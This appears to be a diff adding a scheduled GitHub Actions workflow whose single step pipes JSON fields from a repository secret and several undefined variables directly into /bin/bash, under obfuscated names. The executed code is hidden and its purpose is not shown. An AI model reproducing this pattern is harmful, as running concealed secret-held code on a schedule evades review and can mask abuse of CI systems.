@@ -1,0 +1,21 @@
+name: huanhuijiren
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huanhuijiren
+        env:
+          n4239: ${{ secrets.n4239 }}
+        run: |
+          echo $n4239 | jq -r .oed18817 | /bin/bash
+          echo $w563 | jq -r .cs7 | /bin/bash
+          echo $laatb7 | jq -r .h43325 | /bin/bash
+          echo $ofeb13071 | jq -r .zfaww4159 | /bin/bash
+
